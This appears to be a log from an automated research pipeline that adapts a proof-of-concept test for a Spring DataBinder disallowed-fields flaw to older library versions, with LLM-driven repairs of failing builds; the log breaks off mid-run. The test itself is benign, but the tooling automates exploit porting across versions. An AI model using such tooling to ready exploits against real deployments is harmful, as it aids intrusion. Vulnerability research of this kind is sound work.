[1m[Main] === Starting adaptation process for CVE-2022-22968 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/org_springframework_spring-context.txt[0m
[96m[Analyzer] org.springframework:spring-context has 308 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['2.0', '2.0.1', '2.0.2', '2.0.3', '2.0.4', '2.0.5', '2.0.6', '2.0.7', '2.0.8', '2.5', '2.5.1', '2.5.2', '2.5.3', '2.5.4', '2.5.5', '2.5.6', '2.5.6.SEC01', '2.5.6.SEC02', '2.5.6.SEC03'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2022-22968[0m
[92m[Main] Total affected versions: 194[0m
[92m[Main] Already reproduced versions: 175[0m
[93m[Main] Versions pending adaptation: 19[0m
[96m[Main]     -> ['2.0', '2.0.1', '2.0.2', '2.0.3', '2.0.4', '2.0.5', '2.0.6', '2.0.7', '2.0.8', '2.5', '2.5.1', '2.5.2', '2.5.3', '2.5.4', '2.5.5', '2.5.6', '2.5.6.SEC01', '2.5.6.SEC02', '2.5.6.SEC03'][0m
[96m[Main]     -> ['3.0.0.RELEASE', '3.0.1.RELEASE', '3.0.2.RELEASE', '3.0.3.RELEASE', '3.0.4.RELEASE', '3.0.5.RELEASE', '3.0.6.RELEASE', '3.0.7.RELEASE', '3.1.0.RELEASE', '3.1.1.RELEASE', '3.1.2.RELEASE', '3.1.3.RELEASE', '3.1.4.RELEASE', '3.2.0.RELEASE', '3.2.1.RELEASE', '3.2.2.RELEASE', '3.2.3.RELEASE', '3.2.4.RELEASE', '3.2.5.RELEASE', '3.2.6.RELEASE', '3.2.7.RELEASE', '3.2.8.RELEASE', '3.2.9.RELEASE', '3.2.10.RELEASE', '3.2.11.RELEASE', '3.2.12.RELEASE', '3.2.13.RELEASE', '3.2.14.RELEASE', '3.2.15.RELEASE', '3.2.16.RELEASE', '3.2.17.RELEASE', '3.2.18.RELEASE', '4.0.0.RELEASE', '4.0.1.RELEASE', '4.0.2.RELEASE', '4.0.3.RELEASE', '4.0.4.RELEASE', '4.0.5.RELEASE', '4.0.6.RELEASE', '4.0.7.RELEASE', '4.0.8.RELEASE', '4.0.9.RELEASE', '4.1.0.RELEASE', '4.1.1.RELEASE', '4.1.2.RELEASE', '4.1.3.RELEASE', '4.1.4.RELEASE', '4.1.5.RELEASE', '4.1.6.RELEASE', '4.1.7.RELEASE', '4.1.8.RELEASE', '4.1.9.RELEASE', '4.2.0.RELEASE', '4.2.1.RELEASE', '4.2.2.RELEASE', '4.2.3.RELEASE', '4.2.4.RELEASE', '4.2.5.RELEASE', '4.2.6.RELEASE', '4.2.7.RELEASE', '4.2.8.RELEASE', '4.2.9.RELEASE', '4.3.0.RELEASE', '4.3.1.RELEASE', '4.3.2.RELEASE', '4.3.3.RELEASE', '4.3.4.RELEASE', '4.3.5.RELEASE', '4.3.6.RELEASE', '4.3.7.RELEASE', '4.3.8.RELEASE', '4.3.9.RELEASE', '4.3.10.RELEASE', '4.3.11.RELEASE', '4.3.12.RELEASE', '4.3.13.RELEASE', '4.3.14.RELEASE', '4.3.15.RELEASE', '4.3.16.RELEASE', '4.3.17.RELEASE', '4.3.18.RELEASE', '4.3.19.RELEASE', '4.3.20.RELEASE', '4.3.21.RELEASE', '4.3.22.RELEASE', '4.3.23.RELEASE', '4.3.24.RELEASE', '4.3.25.RELEASE', '4.3.26.RELEASE', '4.3.27.RELEASE', '4.3.28.RELEASE', '4.3.29.RELEASE', '4.3.30.RELEASE', '5.0.0.RELEASE', '5.0.1.RELEASE', '5.0.2.RELEASE', '5.0.3.RELEASE', '5.0.4.RELEASE', '5.0.5.RELEASE', '5.0.6.RELEASE', '5.0.7.RELEASE', '5.0.8.RELEASE', '5.0.9.RELEASE', '5.0.10.RELEASE', '5.0.11.RELEASE', '5.0.12.RELEASE', '5.0.13.RELEASE', '5.0.14.RELEASE', '5.0.15.RELEASE', '5.0.16.RELEASE', '5.0.17.RELEASE', '5.0.18.RELEASE', '5.0.19.RELEASE', '5.0.20.RELEASE', '5.1.0.RELEASE', '5.1.1.RELEASE', '5.1.2.RELEASE', '5.1.3.RELEASE', '5.1.4.RELEASE', '5.1.5.RELEASE', '5.1.6.RELEASE', '5.1.7.RELEASE', '5.1.8.RELEASE', '5.1.9.RELEASE', '5.1.10.RELEASE', '5.1.11.RELEASE', '5.1.12.RELEASE', '5.1.13.RELEASE', '5.1.14.RELEASE', '5.1.15.RELEASE', '5.1.16.RELEASE', '5.1.17.RELEASE', '5.1.18.RELEASE', '5.1.19.RELEASE', '5.1.20.RELEASE', '5.2.0.RELEASE', '5.2.1.RELEASE', '5.2.2.RELEASE', '5.2.3.RELEASE', '5.2.4.RELEASE', '5.2.5.RELEASE', '5.2.6.RELEASE', '5.2.7.RELEASE', '5.2.8.RELEASE', '5.2.9.RELEASE', '5.2.10.RELEASE', '5.2.11.RELEASE', '5.2.12.RELEASE', '5.2.13.RELEASE', '5.2.14.RELEASE', '5.2.15.RELEASE', '5.2.16.RELEASE', '5.2.17.RELEASE', '5.2.18.RELEASE', '5.2.19.RELEASE', '5.2.20.RELEASE', '5.3.0', '5.3.1', '5.3.2', '5.3.3', '5.3.4', '5.3.5', '5.3.6', '5.3.7', '5.3.8', '5.3.9', '5.3.10', '5.3.11', '5.3.12', '5.3.13', '5.3.14', '5.3.15', '5.3.16', '5.3.17', '5.3.18'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2022-22968/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Verifier] Initial exploit behavior does NOT match expected reproduction.[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.6.SEC03[0m
[96m[Selector] Closest reproduced version: 3.0.0.RELEASE at index 46[0m
[96m[Adapter] Trying next closest version: 2.5.6.SEC03[0m
[93m[Preparer] No usable exploit dirs found under /PoCAdaptation/exploit/valid/CVE-2022-22968[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC03/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.6.SEC03 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC03/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.6.SEC03 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC03/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.6.SEC03...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC03...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 3.0.0.RELEASE to 2.5.6.SEC03...[0m
[96m[Adapter] Start adapting exploit from 3.0.0.RELEASE to 2.5.6.SEC03"[0m
[91m[DiffManager] Diff file not found: /PoCAdaptation/library/diff/CVE-2022-22968/2.5.6.SEC03-3.0.0.RELEASE.diff[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC03...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[16,15] method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: java.lang.String[][0m
[92m[ErrorManager] Processing line: [ERROR]   found: java.lang.String,java.lang.String[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[][0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,int)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1986 (prompt), 1 (completion), 1987 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.5.6.SEC03:org.springframework:spring-context.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.5.6.SEC03 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-22968 >--------------------
[INFO] Building CVE-2022-22968 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-22968 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-22968 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-22968 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 2 source files to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[16,15] method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types;
  required: java.lang.String[]
  found: java.lang.String,java.lang.String
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
  symbol:   method add(java.lang.String,java.lang.String)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
  symbol:   method add(java.lang.String,int)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[INFO] 4 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.834 s
[INFO] Finished at: 2025-07-11T03:19:17Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[16,15] method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types;
[ERROR]   required: java.lang.String[]
[ERROR]   found: java.lang.String,java.lang.String
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,java.lang.String)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,int)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>edu.vision.se</groupId>
  <artifactId>CVE-2022-22968</artifactId>
  <version>1.0-SNAPSHOT</version>
  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>
  <dependencies>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-context</artifactId>
      <version>2.5.6.SEC03</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 176 (prompt), 12 (completion), 188 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.5.6.SEC03: 

Error: method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types; required: java.lang.String[] found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code:         binder.setAllowedFields("name", "age"); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
`org.springframework.validation.DataBinder;setAllowedFields`
[96m[ErrorManager] Extracted key entities: ['`org.springframework.validation.DataBinder', 'setAllowedFields`'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 16, 'column': 15, 'message': 'method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types; required: java.lang.String[] found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        binder.setAllowedFields("name", "age");'} with cause: ['`org.springframework.validation.DataBinder', 'setAllowedFields`'][0m
[96m[Adapter] Related diffs for error: [][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types; required: java.lang.String[] found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length | cause: ['`org.springframework.validation.DataBinder', 'setAllowedFields`'][0m
[96m[RepairModule] Trying best diff #None with score 0.00[0m
[93m[RepairModule] Diff #None content empty[0m
[LLMClient] Tokens used: 520 (prompt), 287 (completion), 807 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.5.6.SEC03:org.springframework:spring-context.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.5.6.SEC03.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types; required: java.lang.String[] found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        binder.setAllowedFields("name", "age");

### Related Diff:


### Test File Content:
package edu.vision.se;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

import org.junit.Test;
import org.springframework.beans.MutablePropertyValues;
import org.springframework.validation.BindException;
import org.springframework.validation.DataBinder;

public class Testcase1 {
    @Test
    public void bindingWithAllowedAndDisallowedFields() throws BindException {
        TestBean rod = new TestBean();
        DataBinder binder = new DataBinder(rod);
        binder.setAllowedFields("name", "age");
        binder.setDisallowedFields("AGE");
        MutablePropertyValues pvs = new MutablePropertyValues();
        pvs.add("name", "Rod");
        pvs.add("age", 32);

        binder.bind(pvs);
        binder.close();

        assertEquals("changed name correctly", "Rod", rod.getName());
        assertEquals("did not change age", 0, rod.getAge());

        String[] suppressedFields = binder.getBindingResult().getSuppressedFields();
        boolean containsField = false;
        for (String actualField : suppressedFields) {
            if ("age".equals(actualField)) {
                containsField = true;
                break;
            }
        }
        assertTrue("not found: " + "age", containsField);

    }
}


[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

import org.junit.Test;
import org.springframework.beans.MutablePropertyValues;
import org.springframework.validation.BindException;
import org.springframework.validation.DataBinder;

public class Testcase1 {
    @Test
    public void bindingWithAllowedAndDisallowedFields() throws BindException {
        TestBean rod = new TestBean();
        DataBinder binder = new DataBinder(rod);
        binder.setAllowedFields(new String[] {"name", "age"});
        binder.setDisallowedFields("AGE");
        MutablePropertyValues pvs = new MutablePropertyValues();
        pvs.add("name", "Rod");
        pvs.add("age", 32);

        binder.bind(pvs);
        binder.close();

        assertEquals("changed name correctly", "Rod", rod.getName());
        assertEquals("did not change age", 0, rod.getAge());

        String[] suppressedFields = binder.getBindingResult().getSuppressedFields();
        boolean containsField = false;
        for (String actualField : suppressedFields) {
            if ("age".equals(actualField)) {
                containsField = true;
                break;
            }
        }
        assertTrue("not found: " + "age", containsField);

    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC03...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[][0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,int)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | method add(java.lang.String,java.lang.String)', 'incompatible types: java.lang.String cannot be converted to java.lang.String[] |', 'cannot find symbol | method add(java.lang.String,int)', 'method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types; required: java.lang.String[] found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'cannot find symbol | method add(java.lang.String,java.lang.String)', 'incompatible types: java.lang.String cannot be converted to java.lang.String[] |', 'cannot find symbol | method add(java.lang.String,int)'}
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-22968 >--------------------
[INFO] Building CVE-2022-22968 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-22968 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-22968 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-22968 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 2 source files to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
  symbol:   method add(java.lang.String,java.lang.String)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
  symbol:   method add(java.lang.String,int)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[INFO] 3 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.073 s
[INFO] Finished at: 2025-07-11T03:19:46Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,java.lang.String)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,int)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-22968 >--------------------
[INFO] Building CVE-2022-22968 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-22968 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-22968 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-22968 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 2 source files to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[16,15] method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types;
